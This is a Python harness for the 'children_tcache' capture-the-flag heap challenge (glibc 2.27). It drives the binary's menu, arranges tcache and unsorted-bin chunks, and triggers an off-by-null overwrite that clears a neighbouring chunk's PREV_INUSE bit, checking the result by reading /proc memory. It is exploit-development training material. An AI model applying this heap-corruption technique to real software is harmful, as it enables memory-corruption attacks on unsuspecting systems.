#!/usr/bin/env python3
"""Harness minimo (sem dependencias) para o children_tcache.

Roda o binario com a glibc 2.27 fornecida no handout e expoe as primitivas
do menu (new/show/delete). A funcao dump_heap() le /proc/<pid>/mem para
inspecionar os cabecalhos de chunk sem precisar de gdb.

Uso: python3 solver/probe.py
"""
import os
import struct
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
CHALLENGE = ROOT / "challenge"
LD = CHALLENGE / "ld-2.27.so"
BIN = CHALLENGE / "children_tcache"

U64 = struct.Struct("<Q")
PROMPT = b"Your choice: "


class ChildrenTcache:
    def __init__(self, cwd=CHALLENGE):
        self.proc = subprocess.Popen(
            [str(LD), "--library-path", str(CHALLENGE), str(BIN)],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            bufsize=0,
            cwd=cwd,
        )
        self.recvuntil(PROMPT)

    # -- I/O ---------------------------------------------------------------
    def recvuntil(self, token):
        buf = b""
        while not buf.endswith(token):
            byte = self.proc.stdout.read(1)
            if not byte:
                raise EOFError(f"processo morreu; buffer={buf!r}")
            buf += byte
        return buf

    def send(self, data):
        os.write(self.proc.stdin.fileno(), data)

    def menu(self, choice):
        self.send(str(choice).encode() + b"\n")

    def wait_menu(self):
        self.recvuntil(PROMPT)

    # -- primitivas --------------------------------------------------------
    def add(self, size, data=b"x"):
        """new heap. Use len(data) == size para disparar o off-by-null;
        qualquer outro tamanho e enviado com '\\n' terminador."""
        self.menu(1)
        self.recvuntil(b"Size:")
        self.send(str(size).encode() + b"\n")
        self.recvuntil(b"Data:")
        self.send(data if len(data) == size else data + b"\n")
        self.wait_menu()

    def show(self, index):
        self.menu(2)
        self.recvuntil(b"Index:")
        self.send(str(index).encode() + b"\n")
        line = self.recvuntil(b"\n")
        self.wait_menu()
        return line[:-1]

    def delete(self, index):
        self.menu(3)
        self.recvuntil(b"Index:")
        self.send(str(index).encode() + b"\n")
        self.wait_menu()

    # -- inspecao de memoria ----------------------------------------------
    def heap(self):
        with open(f"/proc/{self.proc.pid}/maps") as maps:
            for line in maps:
                if line.rstrip().endswith("[heap]"):
                    start, end = (int(x, 16) for x in line.split()[0].split("-"))
                    return start, end
        raise RuntimeError("mapeamento [heap] nao encontrado")

    def read_mem(self, addr, size):
        with open(f"/proc/{self.proc.pid}/mem", "rb", buffering=0) as mem:
            mem.seek(addr)
            return mem.read(size)

    def dump_heap(self):
        start, end = self.heap()
        return start, self.read_mem(start, end - start)

    def find_chunk(self, pattern=b"A" * 32):
        """Retorna o endereco de usuario do chunk cujo conteudo comeca
        com `pattern`."""
        start, blob = self.dump_heap()
        offset = blob.find(pattern)
        if offset < 0:
            raise RuntimeError("padrao nao encontrado no heap")
        return start + offset

    def kill(self):
        if self.proc.poll() is None:
            self.proc.kill()
        self.proc.wait()


def chunk_header(ct, user):
    """(prev_size, size) do chunk cujo ponteiro de usuario e `user`."""
    raw = ct.read_mem(user - 0x10, 0x10)
    return U64.unpack(raw[:8])[0], U64.unpack(raw[8:])[0]


def main():
    ct = ChildrenTcache()
    try:
        # Indice 0..6: chunks 0x90/0x110 usados como enchedores do tcache.
        for _ in range(7):
            ct.add(0x80, b"fill90")
        for i in range(7):
            ct.delete(i)

        # A/B/C contiguos, todos com chunk de 0x110.
        for _ in range(7):
            ct.add(0x100, b"fill110")
        ct.add(0x108, b"AAAA")        # idx 7 = A (sem off-by-null ainda)
        ct.add(0x100, b"B" * 8)       # idx 8 = B
        ct.add(0x100, b"C" * 8)       # idx 9 = C

        user_a = ct.find_chunk(b"AAAA")
        print(f"A (user)     = {user_a:#x}")
        prev, size = chunk_header(ct, user_a)
        print(f"A prev/size  = {prev:#x} / {size:#x}")
        b_head = user_a + 0x100
        print("B prev/size  = "
              f"{U64.unpack(ct.read_mem(b_head, 8))[0]:#x} / "
              f"{U64.unpack(ct.read_mem(b_head + 8, 8))[0]:#x}  (antes do free)")

        # Esvazia o tcache 0x110 e libera B -> unsorted; libera A -> merge.
        for i in range(7):
            ct.delete(i)
        ct.delete(8)
        ct.delete(7)

        # Reenche o tcache 0x110.
        for _ in range(7):
            ct.add(0x100, b"fill110")

        # Retira A do chunk consolidado; o resto vira last_remainder.
        ct.add(0x108, b"A" * 0x108)   # idx 7 = A; NUL atinge o size do resto
        user_a = ct.find_chunk(b"A" * 32)
        size_a = chunk_header(ct, user_a)[1]
        rem = user_a + 0x100
        print(f"A size       = {size_a:#x}")
        print("B prev/size  = "
              f"{U64.unpack(ct.read_mem(rem, 8))[0]:#x} / "
              f"{U64.unpack(ct.read_mem(rem + 8, 8))[0]:#x}  (apos off-by-null)")
        print("esperado: size 0x100 (0x111 & ~0xff) com PREV_INUSE limpo")
    finally:
        ct.kill()


if __name__ == "__main__":
    sys.exit(main())
